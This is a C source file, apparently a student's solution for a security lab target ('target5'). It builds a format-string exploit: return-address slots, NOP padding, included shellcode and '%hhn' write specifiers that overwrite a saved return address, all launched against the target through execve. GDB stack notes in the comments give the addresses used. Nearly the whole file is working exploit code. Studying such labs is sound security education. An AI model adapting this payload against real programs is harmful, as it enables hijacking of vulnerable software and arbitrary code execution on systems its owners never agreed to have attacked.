#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define DEFAULT_BUFFER_SIZE 256
#define RIP_ADDR 60

int main(void)
{
  char *args[3];
  char *env[17];

  // formatString addr: 0x3021f9a0
  unsigned long buf_addr = 0x3021f988;
  // buf 0x3021faa0
  // $rsp 0x3021f990
  // shellcode + NOP -> buf[0] - buf[59]
  // buf addr -> buf[60] - buf[67] 0x3021f9a0 00000000

  //   (gdb) x/8wx $rsp
  // 0x3021f990:     0x00000000      0x00000000      0xffffd746      0x00007fff
  // 0x3021f9a0:     0x41414141      0x41414141      0x41414141      0x41414141

  char buff[DEFAULT_BUFFER_SIZE];
	int i; 

  // return addr
  // Each iteration of the loop copies the 64-bit address into the buffer
	// Copy the address into the buffer, byte by byte, in little-endian order
  int num_of_byte;
  num_of_byte = 0;
	buff[0 + num_of_byte] = buf_addr & 0xFF;              // Byte 0
	buff[1 + num_of_byte] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + num_of_byte] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + num_of_byte] = (buf_addr >> 24) & 0xFF;  // Byte 3
  buff[4 + num_of_byte] = '\x00';
  buff[5 + num_of_byte] = '\x00';
  buff[6 + num_of_byte] = '\x00';
  buff[7 + num_of_byte] = '\x00';

  memcpy(&buff[8], "\x90\x90\x90\x90\x90\x90\x90\x90", 8);

  buf_addr = 0x3021f989;
  num_of_byte = 16;
	buff[0 + num_of_byte] = buf_addr & 0xFF;              // Byte 0
	buff[1 + num_of_byte] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + num_of_byte] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + num_of_byte] = (buf_addr >> 24) & 0xFF;  // Byte 3
  buff[4 + num_of_byte] = '\x00';
  buff[5 + num_of_byte] = '\x00';
  buff[6 + num_of_byte] = '\x00';
  buff[7 + num_of_byte] = '\x00';

  memcpy(&buff[24], "\x90\x90\x90\x90\x90\x90\x90\x90", 8);

  buf_addr = 0x3021f98a;
  num_of_byte = 32;
	buff[0 + num_of_byte] = buf_addr & 0xFF;              // Byte 0
	buff[1 + num_of_byte] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + num_of_byte] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + num_of_byte] = (buf_addr >> 24) & 0xFF;  // Byte 3
  buff[4 + num_of_byte] = '\x00';
  buff[5 + num_of_byte] = '\x00';
  buff[6 + num_of_byte] = '\x00';
  buff[7 + num_of_byte] = '\x00';

  memcpy(&buff[40], "\x90\x90\x90\x90\x90\x90\x90\x90", 8);

  buf_addr = 0x3021f98b;
  num_of_byte = 48;
	buff[0 + num_of_byte] = buf_addr & 0xFF;              // Byte 0
	buff[1 + num_of_byte] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + num_of_byte] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + num_of_byte] = (buf_addr >> 24) & 0xFF;  // Byte 3
  buff[4 + num_of_byte] = '\x00';
  buff[5 + num_of_byte] = '\x00';
  buff[6 + num_of_byte] = '\x00';
  buff[7 + num_of_byte] = '\x00';

  // shellcode
	int iter_shell;
	iter_shell = 0;
	for (i = 56; i < (56 + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}


  const char *format = "%08x"; // The format specifier
  int start = 101; // Starting position in the buffer
  // Loop to concatenate the format specifiers
  for (int i = 0; i < 4; ++i) {
      strcpy(&buff[start], format);
      start += strlen(format); // Update the start position
  }

  // write addr: buf 0x3021faa0 + 56 = 0x3021fad8
  // 0xd8 - 32 - 45
  // 0xfa - 0xd8 = 34
  // 0x121 - 0xfa = 39
  // 0x130 - 0x121 = 15
  char format_str_ext[] = "%0139x%hhn%034x%hhn%039x%hhn%015x%hhn";
  memcpy(&buff[start], format_str_ext, strlen(format_str_ext));

  start += strlen(format_str_ext);
  buff[start] = '\x00';
  buff[255] = '\x00'; // Null-terminate the string

  // print for debug
  // =======================================
  int length = strlen(buff);

    for (int i = 0; i < 60; i++) {
        printf("\\x%02x", (unsigned char)buff[i]);
    }
    printf("\n");
    printf("Contents starting from buff[60]: %s\n", &buff[60]);
  // =======================================

  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;

  // null byte for ret addr
  env[0] = &buff[5];
  env[1] = &buff[6];
  env[2] = &buff[7];
  env[3] = &buff[8];

  env[4] = &buff[21];
  env[5] = &buff[22];
  env[6] = &buff[23];
  env[7] = &buff[24];

  env[8] = &buff[37];
  env[9] = &buff[38];
  env[10] = &buff[39];
  env[11] = &buff[40];

  env[12] = &buff[53];
  env[13] = &buff[54];
  env[14] = &buff[55];
  env[15] = &buff[56];
  // env[16] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
